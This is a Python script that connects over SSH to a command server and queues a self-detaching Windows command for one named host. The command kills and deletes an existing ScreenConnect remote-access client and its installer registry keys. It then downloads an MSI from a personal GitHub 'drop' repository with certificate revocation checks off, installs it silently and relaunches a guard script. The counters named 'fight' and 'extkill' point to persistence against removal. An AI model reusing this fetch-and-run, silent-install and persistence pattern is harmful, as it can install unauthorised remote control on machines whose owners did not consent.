#!/usr/bin/env python3
"""Queue a self-detached Gryxa recovery for ADMINIS-0ET5284.

Root cause of failed reinstall:
  - sc delete succeeded but leftover dir files were Access Denied (locks)
  - install-gryxa started msiexec detached and only waited ~35s → sc 1060
  - agent cmd channel only waits 60s, so install must self-detach
"""
from __future__ import annotations

import json
import sys
import time
from pathlib import Path

import paramiko

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

HOST = "144.172.107.56"
KEY = str(Path.home() / ".ssh" / "winrtcs_ed25519")
TARGET = "ADMINIS-0ET5284"

# Self-detach immediately so agent returns QUEUED; real work runs 2+ min.
# C03: no msiexec /x (keeper sevrz present). Kill Gryxa FP procs, force-rmdir, sync msiexec /i.
BODY = r"""
if /I not "%~1"=="--go" (
  >C:\Users\Public\gryxa_recover.cmd echo @echo off
  >>C:\Users\Public\gryxa_recover.cmd echo setlocal EnableExtensions EnableDelayedExpansion
  >>C:\Users\Public\gryxa_recover.cmd echo set "ZD=C:\ProgramData\WinRTCS"
  >>C:\Users\Public\gryxa_recover.cmd echo set "LOG=C:\Users\Public\gryxa_recover.log"
  >>C:\Users\Public\gryxa_recover.cmd echo set "GFP=36e506ff016b2151"
  >>C:\Users\Public\gryxa_recover.cmd echo set "GSVC=ScreenConnect Client (!GFP!)"
  >>C:\Users\Public\gryxa_recover.cmd echo set "MSI=%%ZD%%\gryxa_install.msi"
  >>C:\Users\Public\gryxa_recover.cmd echo set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
  >>C:\Users\Public\gryxa_recover.cmd echo set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
  >>C:\Users\Public\gryxa_recover.cmd echo ^>"%%LOG%%" echo [%%DATE%% %%TIME%%] recover_begin
  >>C:\Users\Public\gryxa_recover.cmd echo ^>%%ZD%%\extkill.cnt echo 0
  >>C:\Users\Public\gryxa_recover.cmd echo ^>%%ZD%%\fight.cnt echo 0
  >>C:\Users\Public\gryxa_recover.cmd echo ^>%%ZD%%\guard.cnt echo 9999
  >>C:\Users\Public\gryxa_recover.cmd echo ^>%%ZD%%\gryxa_boost.cnt echo 15
  >>C:\Users\Public\gryxa_recover.cmd echo rmdir /s /q %%ZD%%\guard.lockd
  >>C:\Users\Public\gryxa_recover.cmd echo sc stop "%%GSVC%%" ^>nul 2^>^&1
  >>C:\Users\Public\gryxa_recover.cmd echo sc delete "%%GSVC%%" ^>nul 2^>^&1
  >>C:\Users\Public\gryxa_recover.cmd echo powershell -NoP -NonI -C "$ErrorActionPreference='SilentlyContinue'; Get-Process | Where-Object { $_.Path -and $_.Path -match '36e506ff016b2151' } | Stop-Process -Force; Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -and $_.ExecutablePath -match '36e506ff016b2151' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }; foreach($d in @(${env:ProgramFiles(x86)}+'\ScreenConnect Client (36e506ff016b2151)',$env:ProgramFiles+'\ScreenConnect Client (36e506ff016b2151)')){ if(Test-Path $d){ takeown /f $d /r /d y | Out-Null; icacls $d /grant Administrators:F /t /c /q | Out-Null; Remove-Item -LiteralPath $d -Recurse -Force } }; 'kill_done' | Out-File -FilePath 'C:\Users\Public\gryxa_recover.log' -Append -Encoding ASCII"
  >>C:\Users\Public\gryxa_recover.cmd echo reg delete "HKLM\SOFTWARE\Classes\Installer\Products\%%PACKED%%" /f ^>nul 2^>^&1
  >>C:\Users\Public\gryxa_recover.cmd echo reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\%%PACKED%%" /f ^>nul 2^>^&1
  >>C:\Users\Public\gryxa_recover.cmd echo reg delete "HKCR\Installer\Products\%%PACKED%%" /f ^>nul 2^>^&1
  >>C:\Users\Public\gryxa_recover.cmd echo reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%%PC%%" /f ^>nul 2^>^&1
  >>C:\Users\Public\gryxa_recover.cmd echo reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%%PC%%" /f ^>nul 2^>^&1
  >>C:\Users\Public\gryxa_recover.cmd echo C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 10 --max-time 180 -o "%%MSI%%" https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi ^>^>%%LOG%% 2^>^&1
  >>C:\Users\Public\gryxa_recover.cmd echo if not exist "%%MSI%%" ^( echo FAIL_NO_MSI^>^>%%LOG%% ^& exit /b 3 ^)
  >>C:\Users\Public\gryxa_recover.cmd echo for %%%%F in ("%%MSI%%") do echo msi_size=%%%%~zF^>^>%%LOG%%
  >>C:\Users\Public\gryxa_recover.cmd echo powershell -NoP -NonI -C "$p=Start-Process msiexec.exe -ArgumentList '/i C:\ProgramData\WinRTCS\gryxa_install.msi /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v C:\ProgramData\WinRTCS\msi_gryxa_install.log' -Wait -PassThru; 'msiexec_exit='+$p.ExitCode | Out-File C:\Users\Public\gryxa_recover.log -Append -Encoding ASCII"
  >>C:\Users\Public\gryxa_recover.cmd echo ping -n 16 127.0.0.1 ^>nul
  >>C:\Users\Public\gryxa_recover.cmd echo sc config "%%GSVC%%" start= auto ^>^>%%LOG%% 2^>^&1
  >>C:\Users\Public\gryxa_recover.cmd echo sc start "%%GSVC%%" ^>^>%%LOG%% 2^>^&1
  >>C:\Users\Public\gryxa_recover.cmd echo ping -n 11 127.0.0.1 ^>nul
  >>C:\Users\Public\gryxa_recover.cmd echo sc query "%%GSVC%%" ^>^>%%LOG%% 2^>^&1
  >>C:\Users\Public\gryxa_recover.cmd echo sc query "%%GSVC%%" 2^>nul ^| findstr /C:"RUNNING" ^>nul
  >>C:\Users\Public\gryxa_recover.cmd echo if errorlevel 1 ^( echo RECOVER=FAIL_SVC^>^>%%LOG%% ^) else ^( echo RECOVER=OK^>^>%%LOG%% ^)
  >>C:\Users\Public\gryxa_recover.cmd echo start "" /min cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_guard.cmd
  start "" /min cmd.exe /c "C:\Users\Public\gryxa_recover.cmd"
  echo RECOVER_DETACHED log=C:\Users\Public\gryxa_recover.log
  exit /b 0
)
""".strip()

# Simpler: one compact PS+cmd line without nested echo hell
BODY2 = (
    r'start "" /min cmd.exe /c "'
    r">C:\Users\Public\gryxa_recover.log echo [%DATE% %TIME%] recover_begin"
    r" & >C:\ProgramData\WinRTCS\extkill.cnt echo 0"
    r" & >C:\ProgramData\WinRTCS\fight.cnt echo 0"
    r" & >C:\ProgramData\WinRTCS\guard.cnt echo 9999"
    r" & >C:\ProgramData\WinRTCS\gryxa_boost.cnt echo 15"
    r" & rmdir /s /q C:\ProgramData\WinRTCS\guard.lockd"
    r" & sc stop \"ScreenConnect Client (36e506ff016b2151)\""
    r" & sc delete \"ScreenConnect Client (36e506ff016b2151)\""
    r" & powershell -NoP -NonI -C \"$ErrorActionPreference='SilentlyContinue'; "
    r"Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -match '36e506ff016b2151' "
    r"-or $_.CommandLine -match '36e506ff016b2151' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }; "
    r"foreach($d in @(${env:ProgramFiles(x86)}+'\\ScreenConnect Client (36e506ff016b2151)',"
    r"$env:ProgramFiles+'\\ScreenConnect Client (36e506ff016b2151)')){ if(Test-Path -LiteralPath $d){ "
    r"cmd /c takeown /f `\"$d`\" /r /d y; cmd /c icacls `\"$d`\" /grant Administrators:F /t /c /q; "
    r"Remove-Item -LiteralPath $d -Recurse -Force } }; "
    r"foreach($k in @('HKLM:\\SOFTWARE\\Classes\\Installer\\Products\\814CC7D9653A3969CD5C14CE440DB313',"
    r"'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\S-1-5-18\\Products\\814CC7D9653A3969CD5C14CE440DB313',"
    r"'HKCR:\\Installer\\Products\\814CC7D9653A3969CD5C14CE440DB313')){ Remove-Item -Path $k -Recurse -Force -EA SilentlyContinue }; "
    r"'purge_done' | Add-Content C:\\Users\\Public\\gryxa_recover.log\""
    r" & C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 10 --max-time 180 "
    r"-o C:\ProgramData\WinRTCS\gryxa_install.msi "
    r"https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi "
    r">>C:\Users\Public\gryxa_recover.log 2>&1"
    r" & powershell -NoP -NonI -C \"$p=Start-Process msiexec.exe -ArgumentList "
    r"'/i C:\\ProgramData\\WinRTCS\\gryxa_install.msi /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress "
    r"/l*v C:\\ProgramData\\WinRTCS\\msi_gryxa_install.log' -Wait -PassThru; "
    r"'msiexec_exit='+$p.ExitCode | Add-Content C:\\Users\\Public\\gryxa_recover.log\""
    r" & ping -n 16 127.0.0.1 >nul"
    r" & sc config \"ScreenConnect Client (36e506ff016b2151)\" start= auto"
    r" & sc start \"ScreenConnect Client (36e506ff016b2151)\""
    r" & ping -n 11 127.0.0.1 >nul"
    r" & sc query \"ScreenConnect Client (36e506ff016b2151)\" >>C:\Users\Public\gryxa_recover.log"
    r" & start \"\" /min cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_guard.cmd"
    r" & echo RECOVER_DONE>>C:\Users\Public\gryxa_recover.log"
    r'"'
    r" & echo RECOVER_DETACHED"
)


def main() -> None:
    # keep under cmd length / DB 4000
    cmd = BODY2.replace("\n", " ").strip()
    print("cmd_len", len(cmd))
    if len(cmd) > 3900:
        raise SystemExit(f"cmd too long: {len(cmd)}")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, username="winrtcs", key_filename=KEY, timeout=20)

    # write cmd to temp file to avoid shell escaping hell
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/recover_cmd.txt", "w") as f:
        f.write(cmd)
    py = f"""
import sqlite3, time
cmd=open('/tmp/recover_cmd.txt',encoding='utf-8').read().strip()
con=sqlite3.connect('/opt/winrtcs/fleet.db')
now=time.time()
cur=con.execute('INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)', (now, {TARGET!r}, cmd[:4000]))
cid=cur.lastrowid
con.execute('''INSERT INTO jobs(ts,name,target,params,cmd_id,note,status,attempts,max_attempts,updated)
 VALUES(?,?,?,?,?,?,?,?,?,?)''',
 (now,'recover-gryxa',{TARGET!r},'{{}}',cid,'self-detach force reinstall','queued',1,3,now))
con.execute("INSERT INTO audit(ts,actor,action,detail) VALUES(?,?,?,?)",
 (now,'admin','recover_gryxa',f'#{cid} {TARGET}'))
con.commit()
print('queued', cid, 'len', len(cmd))
con.close()
"""
    with sftp.file("/tmp/queue_recover.py", "w") as f:
        f.write(py)
    sftp.close()
    _, out, err = ssh.exec_command("sudo python3 /tmp/queue_recover.py", timeout=30)
    print(out.read().decode())
    print(err.read().decode())
    ssh.close()


if __name__ == "__main__":
    main()
